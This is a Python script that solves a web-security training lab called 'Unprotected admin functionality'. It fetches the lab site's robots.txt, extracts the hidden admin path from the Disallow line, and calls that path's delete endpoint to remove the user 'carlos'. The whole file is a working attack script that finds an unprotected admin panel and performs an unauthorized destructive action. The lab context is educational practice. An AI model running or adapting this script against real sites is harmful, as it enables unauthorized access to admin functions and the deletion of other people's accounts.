#########################################################
#
# Lab: Unprotected admin functionality
#
# Hack Steps: 
#      1. Fetch the robots.txt file
#      2. Extract the admin panel hidden path
#      3. Delete carlos from the admin panel
#
#########################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a5800d5034d3fd580f7e4b80092003d.web-security-academy.net"

def main():
    print(Fore.WHITE + "⦗1⦘ Fetching the robots.txt file.. ", end="", flush=True)
    
    robots_txt = fetch("/robots.txt")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the hidden path.. ", end="", flush=True)

    hidden_path = re.findall("Disallow: (.*)", robots_txt.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + hidden_path)
    print(Fore.WHITE + "⦗3⦘ Deleting carlos.. ", end="", flush=True)    

    fetch(f"{hidden_path}/delete?username=carlos")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
        

def fetch(path):
    try:  
        return requests.get(f"{LAB_URL}{path}", allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

